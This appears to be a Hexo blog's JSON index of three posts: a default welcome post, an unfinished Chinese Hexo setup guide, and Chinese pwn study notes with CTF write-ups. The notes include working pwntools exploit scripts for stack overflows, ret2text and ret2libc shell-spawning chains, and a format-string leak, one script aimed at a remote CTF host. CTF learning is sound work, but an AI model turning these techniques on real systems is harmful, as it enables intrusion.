[{"title":"Hello World","url":"/2024/11/12/hello-world/","content":"<p>Welcome to <a href=\"https://hexo.io/\">Hexo</a>! This is your very first post. Check <a href=\"https://hexo.io/docs/\">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href=\"https://hexo.io/docs/troubleshooting.html\">troubleshooting</a> or you can ask me on <a href=\"https://github.com/hexojs/hexo/issues\">GitHub</a>.</p>\n<span id=\"more\"></span>\n\n<h2 id=\"Quick-Start\"><a href=\"#Quick-Start\" class=\"headerlink\" title=\"Quick Start\"></a>Quick Start</h2><h3 id=\"Create-a-new-post\"><a href=\"#Create-a-new-post\" class=\"headerlink\" title=\"Create a new post\"></a>Create a new post</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo new <span class=\"string\">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/writing.html\">Writing</a></p>\n<h3 id=\"Run-server\"><a href=\"#Run-server\" class=\"headerlink\" title=\"Run server\"></a>Run server</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo server</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/server.html\">Server</a></p>\n<h3 id=\"Generate-static-files\"><a href=\"#Generate-static-files\" class=\"headerlink\" title=\"Generate static files\"></a>Generate static files</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo generate</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"Deploy-to-remote-sites\"><a href=\"#Deploy-to-remote-sites\" class=\"headerlink\" title=\"Deploy to remote sites\"></a>Deploy to remote sites</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ hexo deploy</span><br></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n"},{"title":"Hexo博客搭建教程（施工中）","url":"/2024/11/19/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/","content":"<h1 id=\"Hexo搭建步骤\"><a href=\"#Hexo搭建步骤\" class=\"headerlink\" title=\"Hexo搭建步骤\"></a>Hexo搭建步骤</h1><ol>\n<li><p>安装Git</p>\n</li>\n<li><p>安装Node.js</p>\n</li>\n<li><p>安装Hexo</p>\n</li>\n<li><p>GitHub创建个人仓库</p>\n</li>\n<li><p>生成SSH添加到GitHub</p>\n</li>\n<li><p>将hexo部署到GitHub</p>\n</li>\n<li><p>设置个人域名</p>\n</li>\n<li><p>发布文章</p>\n<span id=\"more\"></span></li>\n</ol>\n<h2 id=\"1-安装Git\"><a href=\"#1-安装Git\" class=\"headerlink\" title=\"1.安装Git\"></a>1.安装Git</h2><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。Git非常强大，我觉得建议每个人都去了解一下。廖雪峰老师的Git教程写的非常好，大家可以了解一下。Git教程</p>\n<p>windows：到git官网上下载,<a href=\"https://gitforwindows.org/\">(Git for Windows)</a>下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。</p>\n<p>linux：对linux来说实在是太简单了，因为最早的git就是在linux上编写的，只需要一行代码</p>\n<p><code>sudo apt-get install git</code><br>安装好后，用git –version 来查看一下版本</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192120575.png\" alt=\"image-20241119212052457\"></p>\n<h2 id=\"2-安装Node-js\"><a href=\"#2-安装Node-js\" class=\"headerlink\" title=\"2.安装Node.js\"></a>2.安装Node.js</h2><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。</p>\n<p>windows：nodejs选择LTS版本就行了。</p>\n<p>linux：</p>\n<p><code>sudo apt-get install nodejs</code><br><code>sudo apt-get install npm</code></p>\n<p>安装完后，打开命令行</p>\n<p><code>node -v</code><br><code>npm -v</code><br>检查一下有没有安装成功</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192131259.png\" alt=\"image-20241119213117229\"></p>\n<h2 id=\"3-安装hexo\"><a href=\"#3-安装hexo\" class=\"headerlink\" title=\"3.安装hexo\"></a>3.安装hexo</h2>","categories":["other"],"tags":["教程"]},{"title":"pwn学习笔记","url":"/2024/11/19/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<h2 id=\"知识点\"><a href=\"#知识点\" class=\"headerlink\" title=\"知识点\"></a>知识点</h2><span id=\"more\"></span>\n\n<h3 id=\"栈\"><a href=\"#栈\" class=\"headerlink\" title=\"栈\"></a>栈</h3><p>栈是一种数据结构，遵循后进先出的原则(Last in First Out)，主要有压栈（push）与出栈（pop）两种操作</p>\n<p>eax, ebx, ecx, edx, esi, edi, ebp, esp等都是X86 汇编语言中CPU上的通用寄存器的名称，是32位的寄存器。如果用C语言来解释，可以把这些寄存器当作变量看待。</p>\n<p>在栈中，esp保存栈帧的栈顶地址，ebp保存栈帧的栈底地址</p>\n<p><strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong></p>\n<h3 id=\"栈溢出\"><a href=\"#栈溢出\" class=\"headerlink\" title=\"栈溢出\"></a>栈溢出</h3><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。</p>\n<p>栈溢出的前提是：程序向栈上写入数据；数据的长度不受控制</p>\n<p>最简单的栈溢出就是通过溢出，覆盖程序的返回地址，将返回地址覆盖为system(‘&#x2F;bin&#x2F;sh’)的地址</p>\n<h2 id=\"做题记录\"><a href=\"#做题记录\" class=\"headerlink\" title=\"做题记录\"></a>做题记录</h2><h3 id=\"ret2text\"><a href=\"#ret2text\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><h4 id=\"buu-bjdctf-2020-babystack\"><a href=\"#buu-bjdctf-2020-babystack\" class=\"headerlink\" title=\"[buu]bjdctf_2020_babystack\"></a>[buu]bjdctf_2020_babystack</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192148538.png\" alt=\"image-20241119214836507\"></p>\n<p>使用scanf输入的长度，且后续read时调用长度时用的是无符号整型，那么read处就可以栈溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411192153756.png\" alt=\"image-20241119215350733\"></p>\n<p>发现有写好的后门函数来getshell,直接栈溢出让main函数返回到这个函数的地址即可。</p>\n<p>payload:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;-2&#x27;</span>)</span><br><span class=\"line\">ret = <span class=\"number\">0x4006FA</span></span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;1&#x27;</span>*(<span class=\"number\">0x10</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">func = <span class=\"number\">0x4006E6</span></span><br><span class=\"line\">payload = overflow + p64(ret) + p64(func)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>然后就成功getshell了。</p>\n<h4 id=\"buu-get-started-3dsctf-2016\"><a href=\"#buu-get-started-3dsctf-2016\" class=\"headerlink\" title=\"[buu]get_started_3dsctf_2016\"></a>[buu]get_started_3dsctf_2016</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202004408.png\" alt=\"image-20241120200448344\"></p>\n<p>主函数中看到gets函数，可以栈溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202005932.png\" alt=\"image-20241120200538896\"></p>\n<p>函数列表中看到了getflag函数，同时这个程序是静态编译的，所以考虑ret2text。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202007599.png\" alt=\"image-20241120200707558\"></p>\n<p>需要两个参数都满足if中的条件即可得到flag.</p>\n<p>payload如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">func = <span class=\"number\">0x80489A0</span></span><br><span class=\"line\">ret = <span class=\"number\">0x8048C6E</span></span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;1&#x27;</span>*(<span class=\"number\">0x38</span>)</span><br><span class=\"line\">payload = overflow + p32(func) + p32(ret) + p32(<span class=\"number\">0x308CD64F</span>) + p32(<span class=\"number\">0x195719D1</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(sh.recv())</span><br></pre></td></tr></table></figure>\n\n<p>函数地址与参数之间需要一个返回地址，它可以是0，但是不能不填，否则程序会将参数当作返回地址从而导致getshell失败。此处的地址是动调后得到的main函数运行时的实际返回地址，目的是让程序正常退出。如果填别的会失败。</p>\n<p>溢出的部分没有+4覆盖ebp是因为main函数没有ebp。</p>\n<h3 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h3><h4 id=\"buu-ciscn-2019-c-1\"><a href=\"#buu-ciscn-2019-c-1\" class=\"headerlink\" title=\"[buu]ciscn_2019_c_1\"></a>[buu]ciscn_2019_c_1</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411202035408.png\" alt=\"image-20241120203549373\"></p>\n<p>gets函数可以栈溢出。本题没有能直接调用的system函数，也没有可写可执行的段，故考虑使用ret2libc的方式getshell.</p>\n<p>利用puts泄露libc地址，然后跟libc中的地址计算得出基址，然后在用基址和libc中system的地址调用system函数，从而getshell。</p>\n<p>回到这题，它对输入进行了加密，但是由于使用的是while的结构，在最开始会先ret一次，这个时候就会直接执行我们的payload中想让他执行的内容，所以不用反向加密payload.</p>\n<p>payload:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">file = ELF(<span class=\"string\">&#x27;./elf&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class=\"line\">puts_got = file.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = file.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_puts = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_system = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">shell = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;your choice!\\n&#x27;</span>,<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">overflow = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x58</span></span><br><span class=\"line\">ret = <span class=\"number\">0x400C1C</span></span><br><span class=\"line\">main = <span class=\"number\">0x400B28</span></span><br><span class=\"line\">payload = overflow + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;to be encrypted\\n&#x27;</span>, payload)</span><br><span class=\"line\">libc_addr = u64(sh.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc_base = libc_addr - libc_puts</span><br><span class=\"line\"><span class=\"comment\">#获取libc基址</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">payload = overflow + p64(ret) + p64(pop_rdi) + p64(shell+libc_base) + p64(libc_system+libc_base)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;to be encrypted\\n&#x27;</span>, payload)</span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"GeekChallenge2024-买黑马喽了么\"><a href=\"#GeekChallenge2024-买黑马喽了么\" class=\"headerlink\" title=\"[GeekChallenge2024]买黑马喽了么\"></a>[GeekChallenge2024]买黑马喽了么</h4><p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241523352.png\" alt=\"image-20241124152346315\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519434.png\" alt=\"image-20241124151929401\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519308.png\" alt=\"image-20241124151940284\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241519866.png\" alt=\"image-20241124151949831\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241523496.png\" alt=\"image-20241124152318464\"></p>\n<p>开启了NX保护和随机硬件地址，同时text段中没有可以直接利用的函数，故考虑ret2libc。Write函数处可以栈溢出。由于开启了随机硬件地址，所以还需要获取这个附件本身的基址。</p>\n<p>view函数中else分支处对balance取了地址，同时这里printf的格式化字符串是str1，在上方可以修改，将%x改为%p即可让这个分支输出运行时的balance地址，减去静态地址即可得到基址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/jz5p/pic/202411241533123.png\" alt=\"image-20241124153353094\"></p>\n<p>修改str1需要让balance的值大于它的初始值，但是操作中并没有能让他增加的部分。注意到判断时balance的类型是无符号整型，可以在shop函数中吧balance的值减少到负数来让这个无符号整型大于256.</p>\n<p>可以得到第一部分exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;%p&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Balance : 0x&#x27;</span>)</span><br><span class=\"line\">addr_Balance = <span class=\"built_in\">int</span>(sh.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = addr_Balance-<span class=\"number\">0x4090</span></span><br></pre></td></tr></table></figure>\n\n<p>获得程序基址。</p>\n<p>然后就可以利用基址调用程序的puts函数来泄露libc，然后调用libc中的system函数来getshell.</p>\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = remote(<span class=\"string\">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class=\"number\">14874</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./syscall&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so.6&#x27;</span>)</span><br><span class=\"line\">pop_rdi_ret = <span class=\"number\">0x11f1</span></span><br><span class=\"line\">ret_addr = <span class=\"number\">0x14F8</span></span><br><span class=\"line\">main = <span class=\"number\">0x14F9</span></span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">libc_puts = libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">shell_addr = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">    sh.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;1\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2\\n&#x27;</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;2&#x27;</span>)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;%p&#x27;</span>)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">&#x27;Balance : 0x&#x27;</span>)</span><br><span class=\"line\">addr_Balance = <span class=\"built_in\">int</span>(sh.recv(<span class=\"number\">14</span>), <span class=\"number\">16</span>)</span><br><span class=\"line\">base_addr = addr_Balance-<span class=\"number\">0x4090</span></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;1&#x27;</span>*<span class=\"number\">0x58</span>+p64(pop_rdi_ret+base_addr)+p64(puts_got+base_addr)+p64(puts_plt+base_addr)+p64(main+base_addr)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">addr = u64(sh.recvuntil(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">base_libc = addr-libc_puts</span><br><span class=\"line\">payload1 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x58</span> + p64(ret_addr+base_addr) + p64(pop_rdi_ret+base_addr) + p64(shell_addr+base_libc) + p64(system_addr+base_libc)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;your choice:\\n&#x27;</span>, <span class=\"string\">b&#x27;3&#x27;</span>)</span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&#x27;feedback:\\n&#x27;</span>, payload1)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n","categories":["学习笔记"],"tags":["pwn"]}]